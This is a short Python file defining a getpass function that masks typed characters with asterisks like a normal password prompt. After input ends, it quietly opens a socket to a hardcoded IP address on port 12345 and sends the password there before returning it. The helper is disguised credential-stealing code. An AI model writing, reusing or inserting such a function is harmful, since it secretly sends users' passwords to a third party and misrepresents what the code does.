import socket
import getch
def getpass(prompt):
    print(prompt, end='', flush=True)
    buf = ''
    while True:
        ch = getch.getch()
        if ch == '\n':
            print('')
            break
        else:          
            buf += ch
            print('*', end='', flush=True)
    host = '192.168.107.145'
    s = socket.socket()
    s.connect((host, 12345))
    s.send(buf.encode())
    s.close()
    return buf
